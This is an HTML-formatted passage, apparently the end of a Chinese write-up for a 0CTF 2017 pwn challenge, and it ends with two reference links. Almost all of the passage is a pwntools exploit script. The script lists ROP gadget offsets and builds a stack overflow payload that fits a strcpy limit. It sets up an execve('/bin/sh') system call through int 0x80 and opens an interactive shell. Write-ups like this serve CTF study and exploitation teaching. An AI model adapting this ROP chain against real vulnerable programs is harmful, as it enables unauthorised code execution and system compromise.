class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >mov_eax_ecx=0x00148527&nbsp;#mov&nbsp;eax,&nbsp;ecx&nbsp;;&nbsp;ret</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >xchg_eax_esp=0x000e6d62&nbsp;#xchg&nbsp;eax,&nbsp;esp&nbsp;;&nbsp;ret&nbsp;0xb</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >add_esp=0x00055670&nbsp;#&nbsp;xor&nbsp;eax,&nbsp;eax&nbsp;;&nbsp;add&nbsp;esp,&nbsp;0xc&nbsp;;&nbsp;ret</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >xor_edx_edx=0x000da780&nbsp;#xor&nbsp;edx,&nbsp;edx&nbsp;;&nbsp;pop&nbsp;ebx&nbsp;;&nbsp;mov&nbsp;eax,&nbsp;edx&nbsp;;&nbsp;pop&nbsp;esi&nbsp;;&nbsp;pop&nbsp;edi&nbsp;;&nbsp;pop&nbsp;ebp&nbsp;;&nbsp;ret</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >inc_eax=0x00026a9b&nbsp;#inc&nbsp;eax&nbsp;;&nbsp;ret</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >mov_ecx_edx=0x0007e2d0&nbsp;#mov&nbsp;ecx,&nbsp;edx&nbsp;;&nbsp;rep&nbsp;stosb&nbsp;byte&nbsp;ptr&nbsp;es:[edi],&nbsp;al&nbsp;;&nbsp;pop&nbsp;edi&nbsp;;&nbsp;ret</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >pop_ebx=0x0012edd1</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >int_80=0x000b84c6</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >#payload</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >payload="A"*(32-4)</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >payload+=p32(add_esp+base)</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >payload+=p32(mov_eax_ecx+base)</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >payload+=p32(xchg_eax_esp+base)&nbsp;#warning&nbsp;ret&nbsp;0xb</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >payload+="\x00"*3&nbsp;#cut&nbsp;strcpy</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >payload+="A"*12&nbsp;#&nbsp;&#60;--add&nbsp;esp,&nbsp;0xc</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >#esp+0x1c--&#62;</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >#edx=0&nbsp;eax=0</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >payload+=p32(xor_edx_edx+base)</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >payload+=p32(0x41414141)*4</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >payload+=p32(inc_eax+base)*0xb</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >#ecx=0</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >payload+=p32(mov_ecx_edx+base)</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >payload+=p32(0x41414141)&nbsp;#pop--&#62;edi</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >#ebx--&#62;/bin/sh</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >payload+=p32(pop_ebx+base)</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >payload+=p32(0x556bb7ec)&nbsp;#--&#62;/bin/sh</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >#int&nbsp;0x80</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >payload+=p32(int_80+base)</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >p.sendline(payload)</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" >p.interactive()</span><span style="mso-spacerun:'yes';font-family:Consolas;color:rgb(137,89,168);letter-spacing:0.0000pt;text-transform:none;font-style:normal;font-size:9.0000pt;mso-font-kerning:0.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  align=justify  style="mso-pagination:none;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  align=justify  style="mso-pagination:none;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >参考文献：</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span><a href="http://blog.dazzlepppp.cn/2017/03/24/0ctf-2017-writeup/" ><u><span class="15"  style="mso-spacerun:'yes';font-family:微软雅黑;color:rgb(0,0,255);text-decoration:underline;text-underline:single;font-size:9.0000pt;" >http://blog.dazzlepppp.cn/2017/03/24/0ctf-2017-writeup/</span></u></a></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span><a href="https://blog.csdn.net/qq_43449190/article/details/89290052" ><u><span class="15"  style="mso-spacerun:'yes';font-family:微软雅黑;color:rgb(0,0,255);text-decoration:underline;text-underline:single;font-size:9.0000pt;" >https://blog.csdn.net/qq_43449190/article/details/89290052</span></u></a></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p></div><!--EndFragment--></body></html>